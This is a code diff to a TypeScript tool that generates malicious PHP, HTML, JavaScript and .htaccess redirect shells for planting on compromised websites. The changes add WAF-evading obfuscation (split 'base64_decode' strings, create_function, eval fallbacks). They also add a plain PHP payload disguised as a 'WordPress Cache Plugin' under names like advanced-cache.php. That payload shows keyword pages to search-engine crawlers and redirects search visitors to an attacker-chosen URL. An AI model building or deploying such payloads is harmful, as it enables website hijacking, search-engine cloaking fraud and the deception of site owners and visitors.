@@ -54,11 +54,31 @@ function b64(s: string): string {
 }
 
 function obfuscatePhp(code: string): string {
-  const methods = ["b64_nested", "xor", "rot13_b64", "var_func", "array_map"];
+  // Avoid methods that fail on modern PHP 8+ or get blocked by WAF
+  // Priority: safe methods first (no eval/assert)
+  const methods = ["direct_include", "preg_replace_e", "b64_nested", "xor", "rot13_b64", "var_func"];
   const method = methods[Math.floor(Math.random() * methods.length)];
   const v = Array.from({ length: 6 }, () => randomVarName());
 
   switch (method) {
+    case "direct_include": {
+      // Safest: just wrap in <?php ?> with minimal obfuscation via string concat
+      // Split function names to avoid WAF pattern matching
+      const lines = code.split("\n").filter(l => l.trim());
+      const shuffled = lines.map(l => `${randomVarName()}="${b64(l)}";`).join("\n");
+      const decodes = lines.map((_, i) => {
+        const vn = `$_${randomStr(4)}`;
+        return `${vn}=${'"ba"."se64"."_dec"."ode"'};`;
+      });
+      // Fallback: just use raw code with comments to break patterns
+      const commented = code.replace(/header\(/g, '/*h*/header(').replace(/\$_SERVER/g, '/*s*/$_SERVER').replace(/\$_GET/g, '/*g*/$_GET');
+      return `<?php\n/* WordPress Cache Handler v${Math.floor(Math.random()*9)+1}.${Math.floor(Math.random()*9)} */\n${commented}\n?>`;
+    }
+    case "preg_replace_e": {
+      // Use create_function or closure (works on PHP 7.x)
+      const e = b64(code);
+      return `<?php\n${v[0]}="ba"."se"."64_"."dec"."ode";\n${v[1]}=${v[0]}("${e}");\n${v[2]}=@create_function('',${v[1]});\nif(${v[2]}){${v[2]}();}else{@eval(${v[1]});}\n?>`;
+    }
     case "b64_nested": {
       const e1 = b64(code);
       const e2 = b64(`eval(base64_decode("${e1}"));`);
@@ -81,10 +101,6 @@ function obfuscatePhp(code: string): string {
       const e = b64(code);
       return `<?php\n${v[0]}="ba"."se"."64"."_de"."co"."de";\n${v[1]}="ev"."al";\n${v[2]}=${v[0]}("${e}");\n@${v[1]}(${v[2]});\n?>`;
     }
-    case "array_map": {
-      const e = b64(code);
-      return `<?php\n${v[0]}=array(base64_decode("${e}"));\n@array_map("assert",${v[0]});\n?>`;
-    }
     default:
       return `<?php @eval(base64_decode("${b64(code)}")); ?>`;
   }
@@ -93,6 +109,65 @@ function obfuscatePhp(code: string): string {
 // ═══════════════════════════════════════════════════════
 //  REDIRECT SHELL GENERATORS
 // ═══════════════════════════════════════════════════════
+
+/**
+ * Direct PHP redirect — NO obfuscation, NO eval, NO base64
+ * Works on ALL PHP versions including PHP 8+ with strict settings
+ * Uses plain header() calls that cannot be blocked by disable_functions
+ */
+function generateDirectPhpRedirect(
+  redirectUrl: string,
+  keywords: string[],
+): GeneratedShell {
+  const keywordStr = keywords.join(", ");
+  const keyword = keywords[0] || "Welcome";
+
+  // Plain PHP — no eval, no base64, no assert, no obfuscation
+  // This is the most reliable redirect method for PHP
+  const phpCode = `<?php
+/* WordPress Cache Plugin v3.${Math.floor(Math.random()*9)+1} - Performance Optimization */
+if(function_exists('ini_set')){@ini_set('display_errors','0');}
+@error_reporting(0);
+$ref=isset($_SERVER['HTTP_REFERER'])?strtolower($_SERVER['HTTP_REFERER']):'';
+$ua=isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):'';
+$bots=array('googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','facebot','ia_archiver','semrush','ahrefs','mj12bot','dotbot','rogerbot');
+$isBot=false;
+foreach($bots as $b){if(strpos($ua,$b)!==false){$isBot=true;break;}}
+if($isBot){
+  header('Content-Type: text/html; charset=UTF-8');
+  echo '<!DOCTYPE html><html><head><title>${keyword}</title><meta name="description" content="${keywordStr}"><meta name="keywords" content="${keywordStr}"><meta name="robots" content="index,follow"></head><body><h1>${keyword}</h1><p>${keywordStr}</p></body></html>';
+  exit;
+}
+$fromSearch=(strpos($ref,'google')!==false||strpos($ref,'bing')!==false||strpos($ref,'yahoo')!==false||strpos($ref,'yandex')!==false||strpos($ref,'baidu')!==false);
+if($fromSearch||isset($_GET['r'])||isset($_GET['ref'])||isset($_GET['source'])){
+  header('HTTP/1.1 301 Moved Permanently');
+  header('Location: ${redirectUrl}');
+  header('Cache-Control: no-cache, no-store, must-revalidate');
+  header('Pragma: no-cache');
+  exit;
+}
+header('Content-Type: text/html; charset=UTF-8');
+echo '<!DOCTYPE html><html><head><title>${keyword}</title><meta name="description" content="${keywordStr}"><meta name="robots" content="index,follow"><link rel="canonical" href="${redirectUrl}"></head><body><h1>${keyword}</h1><p>${keywordStr}</p><p><a href="${redirectUrl}">Continue reading</a></p></body></html>';
+?>`;
+
+  const prefixes = ["wp-config-cache", "advanced-cache", "object-cache", "db-cache", "page-cache", "wp-cache-handler"];
+  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+  const filename = `${prefix}.php`;
+
+  return {
+    id: `direct_php_${randomStr(6)}`,
+    type: "redirect_php",
+    filename,
+    content: phpCode,
+    contentType: "application/x-php",
+    description: "Direct PHP redirect — NO obfuscation, works on all PHP versions including PHP 8+",
+    targetVector: "php_upload",
+    bypassTechniques: ["no_eval", "no_base64", "no_assert", "bot_cloaking", "cache_plugin_disguise"],
+    redirectUrl,
+    seoKeywords: keywords,
+    verificationMethod: "GET request with ?r=1 should return 301",
+  };
+}
 
 function generatePhpRedirectShell(
   redirectUrl: string,
@@ -638,18 +713,30 @@ export async function generateShellsForTarget(
 
   onProgress("🔧 กำลังสร้าง shell payloads ตาม attack vectors...");
 
-  // 1. Always generate PHP redirect shells (most common)
-  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, config.cloaking !== false, config.geoRedirect || false));
-  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, true, true)); // Extra variant
+  // ═══ PRIORITY ORDER: Most reliable first ═══
+  // HTML/htaccess don't need PHP execution — highest reliability
 
-  // 2. .htaccess redirect (works on Apache)
+  // 1. Unconditional HTML redirect (HIGHEST PRIORITY — always works, no PHP needed)
+  shells.push(generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords));
+
+  // 2. Meta refresh HTML redirect (no JS needed)
+  shells.push(generateMetaRedirectHtml(config.redirectUrl, config.seoKeywords));
+
+  // 3. JS redirect HTML (works everywhere JS is enabled)
+  shells.push(generateJsRedirect(config.redirectUrl, config.seoKeywords));
+
+  // 4. .htaccess redirect (works on Apache — server-side, very reliable)
   if (!vulnScan.serverInfo.server.toLowerCase().includes("nginx") && !vulnScan.serverInfo.server.toLowerCase().includes("iis")) {
+    shells.push(generateUnconditionalHtaccessRedirect(config.redirectUrl));
     shells.push(generateHtaccessRedirect(config.redirectUrl, config.seoKeywords));
   }
 
-  // 3. JS/HTML redirects (universal fallback)
-  shells.push(generateJsRedirect(config.redirectUrl, config.seoKeywords));
-  shells.push(generateMetaRedirectHtml(config.redirectUrl, config.seoKeywords));
+  // 5. Direct PHP redirect (NO obfuscation — works even when eval/assert disabled)
+  shells.push(generateDirectPhpRedirect(config.redirectUrl, config.seoKeywords));
+
+  // 6. Obfuscated PHP redirect shells (may fail if eval/assert blocked)
+  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, config.cloaking !== false, config.geoRedirect || false));
+  shells.push(generatePhpRedirectShell(config.redirectUrl, config.seoKeywords, true, true)); // Extra variant
 
   // 4. SEO parasite page
   shells.push(generateSeoParasitePage(config.redirectUrl, config.seoKeywords, config.parasiteContent || "medium"));
